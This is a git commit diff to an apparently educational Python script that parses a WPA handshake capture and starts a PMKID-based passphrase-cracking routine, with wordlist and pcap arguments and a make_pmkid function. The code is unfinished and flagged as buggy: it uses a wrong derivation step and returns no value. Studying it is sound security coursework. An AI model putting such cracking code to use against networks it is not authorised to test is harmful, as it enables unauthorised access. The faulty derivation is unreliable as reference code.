6d33a8b371b7a2df3fb57a6980143076ff80f535
YanickHEIG <yanick.thomann@heig-vd.ch>
2023-04-30 22:19:40 +0200

    3 - problème dans construction PMKID à partir de passphrase, voir fn make_pmkid

--- files/3_wpa_key_derivation.py
+++ files/3_wpa_key_derivation.py
@@ -2,11 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
 """
 
 __author__      = "Abraham Rubinstein et Yann Lederrey"
@@ -23,19 +19,18 @@ from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
+import argparse
+import binascii
 
-def customPRF512(key,A,B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
-    return R[:blen]
+parser = argparse.ArgumentParser(description='Process .pcap file and wordlist file')
+parser.add_argument('-c', '--pcap', type=str, required=True,help='path to .pcap file')
+parser.add_argument('-w', '--wordlist', type=str, required=True,help='path to wordlist file')
+
+args = parser.parse_args()
+
+pcap = args.pcap
+wordlist = args.wordlist
+
 
 # Custom class to store the SSID and MAC address of an AP   
 class AP(NamedTuple):
@@ -109,35 +104,6 @@ def get_wifi_clients(pcap):
     else:
         print("No WiFi clients found, exiting...")
         exit()
-# Function used to retrieve WPA nonces from a wireshark capture
-def get_wpa_nonce(pcap, mac):
-    for packet in pcap:
-        # check if the packet is a WPA key packet from the AP
-        if packet.haslayer(EAPOL) and packet.addr2 == mac:
-            # extract the nonce value from the packet's WPA key data
-            key_data = packet[EAPOL].load
-            nonce = key_data[13:45].hex()
-            return nonce
-    # if no WPA nonce is found, return None
-    print("Nonce not found in packets")
-    exit()
-
-# Function used to retrieve the MIC of the 4th packet of the 4-way handshake
-def get_wpa_mic(pcap, client_mac, ap_mac):
-    for packet in pcap:
-        # check if the packet is the fourth packet of a 4-way handshake from the client to the AP
-        if (packet.haslayer(EAPOL) 
-        and packet.addr2 == client_mac 
-        and packet.addr1 == ap_mac 
-        and packet[EAPOL].type == 3
-        and packet[EAPOL].len == 95):
-            # extract the WPA MIC value from the packet's WPA key data
-            key_data = packet[EAPOL].load
-            mic = key_data[-18:-2].hex()
-            return mic
-    # if no WPA MIC is found, return None
-    print("MIC not found, maybe there is no 4-way handshake ?")
-    exit()
 
 # Function used to retrive the PMKID from the 1st packet of a WPA 4-way handshake
 def get_wpa_pmkid(pcap, client_mac, ap_mac):
@@ -154,8 +120,33 @@ def get_wpa_pmkid(pcap, client_mac, ap_mac):
     print("PMKID not found")
     exit()
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("PMKID_handshake.pcap") 
+def make_pmkid(ap_mac, client_mac, ssid, passphrase):
+    # derive pmk from passphrase and ssid
+    # https://cylab.be/blog/32/how-does-wpawpa2-wifi-security-work-and-how-to-crack-it
+
+    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096)
+
+    print('PMK:', pmk.hex())
+
+    ap_mac_bytes = bytes(bytes.fromhex(ap_mac.replace(':','')))
+    client_mac_bytes = bytes(bytes.fromhex(client_mac.replace(':','')))
+    pmk_name_bytes = bytes("PMK Name".encode())
+
+
+    data = pmk_name_bytes + ap_mac_bytes + client_mac_bytes
+    
+    #data = "PMK Name".encode() + ap_mac.replace(':', '').encode()  + client_mac.replace(':', '').upper().encode()
+    print(f'DAta: ', data.hex())
+    pmkid = hashlib.pbkdf2_hmac('sha1', pmk, data, 1)[:16]
+    print(f'pmkid : ', pmkid.hex())
+
+
+
+
+if pcap == "":
+    wpa=rdpcap("PMKID_handshake.pcap") 
+else:
+    wpa=rdpcap(pcap)
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
@@ -166,8 +157,12 @@ AP          = find_ssid(wpa)
 cl_mac      = get_wifi_clients(wpa)
 # Get the ssid from the AP object
 ssid        = AP.ssid
-# Transform MAC address to remove semi colons
-APmac       = a2b_hex(AP.mac_address.replace(':',''))
-Clientmac   = a2b_hex(cl_mac.replace(':',''))
+ap_mac      = AP.mac_address
 
-print(get_wpa_pmkid(wpa, cl_mac, AP.mac_address))
+
+
+pmkid_to_check = get_wpa_pmkid(wpa, cl_mac, AP.mac_address)
+print(f'PMKID from cap : {pmkid_to_check}')
+
+pmkid_attempt = make_pmkid(ap_mac, cl_mac, ssid, "admin123")
+print(f'PMKID built : {pmkid_attempt}')
